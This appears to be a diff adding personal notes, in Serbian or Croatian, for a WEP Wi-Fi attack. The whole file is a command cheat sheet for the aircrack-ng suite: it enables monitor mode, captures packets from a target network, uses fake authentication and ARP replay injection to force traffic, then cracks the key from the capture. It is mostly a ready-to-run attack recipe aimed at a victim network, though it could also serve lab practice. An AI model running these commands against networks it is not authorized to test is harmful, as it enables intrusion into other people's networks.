@@ -1,0 +1,19 @@
+WI-FI ATTACK - WEP
+
+	Monitor mode
+		iwconfig - lista svih wi-fi interfejsa
+		ifconfig {wifi_name} down
+		airmon-ng check kill
+		iwconfig {wifi_name} mode monitor
+		ifconfig {wifi_name} up
+
+	Hvatanje paketa:
+		airodump-ng {wifi_name}
+		airodump-ng --bssid {koga_napadamo} -c 3 --write test {wifi_name}
+
+	Pojacavanje hvatanja paketa - kacenje na mrezu:
+		aireplay-ng --fakeauth 0 -a {koga_napadamo} -h {nasa_adresa} {wifi_name}
+		aireplay-ng --arpreplay -b {koga_napadamo} -h {nasa_adresa} {wifi_name}
+
+	Skeniranje uhvacenih paketa:
+		aircrack-ng test-01.cap
